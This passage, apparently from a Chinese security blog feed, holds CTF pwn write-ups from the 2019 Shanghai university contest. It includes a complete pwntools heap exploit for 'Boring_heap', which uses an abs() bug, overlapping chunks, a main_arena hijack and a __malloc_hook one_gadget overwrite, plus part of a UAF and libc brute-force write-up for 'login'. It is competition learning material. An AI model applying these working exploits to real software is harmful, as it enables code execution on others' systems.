operator">+</span>p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2019 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> off by one </tag>
            
            <tag> 格式化字符串 </tag>
            
            <tag> 2.23 double free </tag>
            
            <tag> canary ssp leak </tag>
            
            <tag> 多线程堆溢出 </tag>
            
            <tag> 2.27 double free </tag>
            
            <tag> canary </tag>
            
            <tag> global max fast </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019-上海市大学生信息安全竞赛</title>
      <link href="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/"/>
      <url>/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/</url>
      
        <content type="html"><![CDATA[<h1 id="Boring-heap"><a href="#Boring-heap" class="headerlink" title="Boring_heap"></a>Boring_heap</h1><h2 id="0x01-查看文件"><a href="#0x01-查看文件" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/0.png"></div>保护全开<p>考点：abs漏洞、overlapping</p><h2 id="0x02-IDA分析"><a href="#0x02-IDA分析" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h2><p>创建：（指定三个size的大小：0x20、0x30、0x40）没什么漏洞</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/1.png"></div>删除（无UAF）但是我们看到有abs函数，上网查查发现输入0x80000000会被当做对应的负数。（漏洞点）但是这里由于其判断长度貌似也用不上。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/2.png"></div>编辑<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/3.png"></div>这里就产生了可利用的漏洞了，余后得负数向前写入。<p>通过验证，0x80000000%0x48的长度会产生-32的余数。那么就可以修改size和fd了。。。</p><p>考察点&amp;难点:</p><p>考察点一：发现漏洞函数的机敏性（abs）<br>考察点二：利用unsorted bin删除策略覆盖后面chunk，使其空间复用，达到修改数据的目的<br>考察点三：劫持main_arean位置，修改top chunk</p><h2 id="0x03-思路"><a href="#0x03-思路" class="headerlink" title="0x03 思路"></a>0x03 思路</h2><p>利用abs漏洞修改size，覆盖下一个的chunk，合并为一个unsortedbin，再从unsorted bin中分配一个chunk，利用空间复用的第二个chunk打印出libc地址。再利用一次修改fd指针为main arean中数据，要分配mainarean，那么就要将fastbin中对应位置的fd改为0x51，这样才可以满足题目分配策略。最后修改top chunk为malloc_hook位置。</p><h2 id="0x04-步骤"><a href="#0x04-步骤" class="headerlink" title="0x04 步骤"></a>0x04 步骤</h2><p>步骤一：泄露libc：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># leak base</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x22"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x33"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"\x44"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 3</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x55"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 4</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x80000000</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xb1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1=1+2+3</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x66"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 5=1 剩余的部分就是2chunk了</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>main_arena <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">88</span>libc_base <span class="token operator">=</span> main_arena<span class="token number">-0x3c4b20</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>步骤二：<br>1.先准备好将fastbin 0x50位置改为0x51的chunk，该位置是在main arean中，所以可以劫持main_arean的内存</p><pre class="line-numbers language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x77"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 6=2</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"\x88"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 7 use unsorted bin，在这里改就会导致下面分配下一个0x51的chunk出错</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.空间复用，修改fastbin 中fd为main_arean位置</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># modify fd to mainarean &amp; malloc arean mainarean</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x99"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 8</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"\x10"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 9</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"\x12"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 10</span>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x80000000</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 8=8+9</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x13"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 11=8</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"\x14"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 12=9</span>delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>main_arena<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3.修改fastbin 中0x50链的fd为0x51（目的是让main arean中的数据有0x51，才能分配过去）</p><pre class="line-numbers language-python"><code class="language-python">delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x51</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x88"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 13=6=2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>步骤三：分配过去，改掉top chunk为malloc_hook-0x10位置，那么下一次就会分配到想要的malloc_hook地址，写入one_gadget</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># modify top chunk to malloc hook</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"\x14"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 14</span>target_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token operator">*</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xf1147</span><span class="token operator">+</span>libc_base<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># update()</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Exit\n"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Large\n"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x05-exp"><a href="#0x05-exp" class="headerlink" title="0x05 exp"></a>0x05 exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn1"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./360pwn1"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level  <span class="token operator">=</span>  <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># 3:0x40,2:0x30,1:0x20</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>chunkType<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Exit\n"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Large\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>chunkType<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content:\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>position<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Exit\n"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"update?\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"update?\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>position<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content:\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Exit\n"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"delete?\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Exit\n"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"view?\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak base</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x22"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x33"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"\x44"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 3</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x55"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 4</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x80000000</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xb1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1=1+2+3</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x66"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 5=1</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>main_arena <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">88</span>libc_base <span class="token operator">=</span> main_arena<span class="token number">-0x3c4b20</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># modify fastbin list fd value=0x51,for malloc mainarean chunk</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x77"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 6=2</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"\x88"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 7 use unsorted bin</span><span class="token comment" spellcheck="true"># modify fd to mainarean &amp; malloc arean mainarean</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x99"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 8</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"\x10"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 9</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"\x12"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 10</span>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x80000000</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 8=8+9</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x13"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 11=8</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"\x14"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 12=9</span>delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>main_arena<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># modify 0x50 fastbin list fd to 0x51, unless the previous will make fault</span>delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x51</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x88"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 13=6=2</span><span class="token comment" spellcheck="true"># modify top chunk to malloc hook</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"\x14"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 14</span>target_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token operator">*</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xf1147</span><span class="token operator">+</span>libc_base<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># update()</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Exit\n"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Large\n"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><h2 id="0x01-查看文件-1"><a href="#0x01-查看文件-1" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/4.png"></div>没开PIE，但是其他的全部都打开了。首先看看有没有在bss段位置有什么输入的信息。<p>考点：UAF、libc地址爆破</p><h2 id="0x02-IDA分析-1"><a href="#0x02-IDA分析-1" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h2><p>创建：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/5.png"></div>创建登录密码，size为0x0~0x100，bss段指向0x20的管理chunk，管理的chunk结构体如图所示：第二个元素为函数指针。注意是先创建pass的chunk，再创建0x20管理的chunk。<p>删除:</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/6.png"></div>存在UAF漏洞，并且删除过程是先删除pass chunk再删除管理的chunk<p>登录：泄露信息功能</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/7.png"></div>先比较是不是相同，再调用函数指针，我们看看函数指针是什么：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/8.png"></div>打印出pass信息。那么这里肯定是要进行 leak libc_base了。（当时也想到了，但是怎么leak？？？）<p>编辑：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/9.png"></div>直接写入新的password。<h2 id="0x03-思路-1"><a href="#0x03-思路-1" class="headerlink" title="0x03 思路"></a>0x03 思路</h2><p>考察点&amp;思路：UAF的利用思路，利用思路是考虑过的，首先leak出libc_base,在创建一个chunk，写入one_gadget到函数指针位置，最后调用这个命令来getshell。以及特殊情况下libc_base的爆破。</p><p>难点：libc_base的爆破，就是因为这个问题，没有得到解决导致这道题目没能做出。。。</p><h2 id="0x04-步骤-1"><a href="#0x04-步骤-1" class="headerlink" title="0x04 步骤"></a>0x04 步骤</h2><p><strong>步骤一：爆破出libc_base:(由于只有6次创建机会，那么第1次释放后第二次爆破一个字节，0x7f一个字节，输入一个字符为一个字节，第三次创建爆破一个字节，第四次爆破两个字节)</strong></p><pre class="line-numbers language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    login<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"success!"</span> <span class="token keyword">in</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        